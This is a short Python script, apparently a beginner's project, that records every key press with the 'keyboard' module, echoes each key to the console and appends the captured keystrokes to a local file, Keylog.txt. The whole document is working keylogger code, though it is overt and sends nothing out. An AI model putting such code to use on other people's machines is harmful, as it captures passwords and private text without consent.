#Built 1 by Sanket
#importing keyboard module
import keyboard

#saving our keystrokes as string to put in file to read later 
Keystrokes= ""

#Function for every key pres on the keyboard.
def on_keypress(event):
    global Keystrokes
    key = event.name
    Keystrokes += key
    print(f"Key pressed: {key}")

keyboard.on_press(on_keypress)

print("Listening for key presses. Press Ctrl+C to exit.")

# Wait for Ctrl+C to exit
keyboard.wait('ctrl + c')

keyboard.unhook_all()  # Unhook all callbacks

print("\nCharacters pressed were:")
print(Keystrokes)  # Print the accumulated characters stored in 'Keystrokes' variable


#writing keylogs in to  a file. "Opening -> Writing data -> closing  the file"
Keylog=open("Keylog.txt","a")
Keylog.write(Keystrokes + "\n")
Keylog.close()
